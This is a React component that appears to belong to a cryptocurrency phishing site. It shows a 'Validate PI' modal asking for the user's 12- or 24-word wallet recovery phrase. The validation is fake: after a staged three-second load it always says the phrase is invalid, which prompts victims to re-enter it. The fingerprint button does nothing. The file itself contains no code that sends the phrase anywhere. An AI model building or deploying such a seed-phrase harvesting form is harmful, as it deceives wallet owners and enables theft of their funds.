import { Button, message, Modal } from "antd";
import TextArea from "antd/es/input/TextArea";
import { motion } from "framer-motion";
import { useState } from "react";
import { GiFingerPrint } from "react-icons/gi";
import { MdPassword } from "react-icons/md";
import Loading from "./Loading";

type Props = {
  open: boolean;
  setOpen: (arg: boolean) => void;
};

const ValidateModal = (props: Props) => {
  const [errorMessage, setErrorMessage] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [phrase, setPhrase] = useState("");

  if (isLoading) {
    return <Loading />;
  }

  const handleClick = () => {
    if (phrase === "") {
      setErrorMessage(true);
      return message.error("Please Enter Your Passphrase");
    }
    setIsLoading(true);
    setTimeout(() => {
      setErrorMessage(true);
      message.error("Invalid Pass Phrase");
      setIsLoading(false);
    }, 3000);
    setTimeout(() => {
      setErrorMessage(false);
    }, 6000);
  };

  return (
    <Modal
      footer={false}
      closeIcon={false}
      open={props.open}
      onClose={() => props.setOpen(false)}
      onCancel={() => props.setOpen(false)}
    >
      <div className="border-b pb-2">
        <p className="text-3xl font-semibold">Validate PI</p>
        <p className="capitalize text-base">Validate your pi to continue</p>
      </div>

      {errorMessage && (
        <motion.div
          initial={{
            y: 20,
          }}
          animate={{
            y: 0,
          }}
          transition={{
            type: "spring",
            stiffness: 550, // Higher stiffness for a more dramatic, "snappy" bounce
            damping: 5, // Lower damping to increase the bounce effect
            mass: 1, // Adjust mass if you want it to bounce a little slower/faster
            duration: 0.5,
            bounce: 0.7, // Adds an inherent bounce effect
          }}
          className="error-msg border border-red-600 w-full bg-red-200 text-red-800 font-semibold p-4 py-2 rounded-lg"
        >
          Invalid Pass Phrase. Please try again
        </motion.div>
      )}

      <div className="flex flex-col gap-2 items-center mb-6 mt-2">
        <p className="">Please enter your 12/24 word phrase</p>

        <TextArea
          className="border-yellow-700"
          placeholder="Enter Your 12/24 word phrase"
          rows={6}
          value={phrase}
          onChange={(e) => {
            setErrorMessage(false);
            setPhrase(e.target.value);
          }}
        />
        <p className="">Use ',' to separate wallet keys</p>
      </div>
      <div className="flex gap-2">
        <Button
          type="primary"
          onClick={handleClick}
          className="h-12 w-full font-semibold"
          icon={<MdPassword className="text-2xl" />}
        >
          Validate with passphrase
        </Button>
        <Button
          type="primary"
          className="h-12 w-full font-semibold"
          icon={<GiFingerPrint className="text-2xl" />}
        >
          Validate with fingerprint
        </Button>
      </div>
    </Modal>
  );
};

export default ValidateModal;
